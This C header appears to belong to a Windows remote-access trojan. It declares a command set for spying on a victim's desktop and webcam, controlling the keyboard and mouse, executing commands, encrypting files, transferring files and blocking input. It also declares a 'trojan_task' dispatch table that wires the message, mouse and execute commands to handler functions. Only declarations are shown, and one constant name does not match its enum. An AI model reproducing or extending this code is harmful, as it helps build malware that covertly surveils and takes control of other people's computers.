#pragma once

#ifndef __COMMANDS_H_INCLUDED__
#define __COMMANDS_H_INCLUDED__

#include "..\Constants.h" // TODO: Remove, when all functions will be enabled

#include <Windows.h>

typedef enum
{
	MESSAGEBOX,
	VIEWDESKTOP_START,
	VIEWDESKTOP_STOP,
	VIEWWEBCAM_START,
	VIEWWEBCAM_STOP,
	KEYBOARDCTRL,
	MOUSECTRL,
	EXECUTECMD,
	ENCRYPTFILE,
	DECRYPTFILE,
	IMPORTFILE,
	EXPORTFILE,
	BLOCKINPUT,
	PLAYSOUND,

	NUMBER_OF_COMMAND,
	UNDEFINEDCMD = -1
} Command;

typedef struct
{
	PTCHAR name;
	INT    code;
} PAIR;

typedef VOID(*trojan_task)(CONST PVOID args, PTCHAR result);

typedef struct
{
	PAIR        pair;
	trojan_task task;
} MAP;

VOID _on_task_MESSAGEBOX(CONST PVOID args, PTCHAR result);
VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result);
VOID _on_task_MOUSECTRL(CONST PVOID args, PTCHAR result);
VOID _on_task_EXECUTECMD(CONST PVOID args, PTCHAR result);

static CONST MAP MAP_COMMANDS[NUMBER_OF_COMMANDS] =
{
	{ { TEXT("message"), MESSAGEBOX }, _on_task_MESSAGEBOX },
	{ { TEXT("mouse"  ), MOUSECTRL  }, _on_task_MOUSECTRL  },
	{ { TEXT("execute"), EXECUTECMD }, _on_task_EXECUTECMD }
};

INT          cmd2code(CONST PTCHAR cmd);
CONST PTCHAR code2cmd(INT cmd);

#endif /* __COMMANDS_H_INCLUDED__ */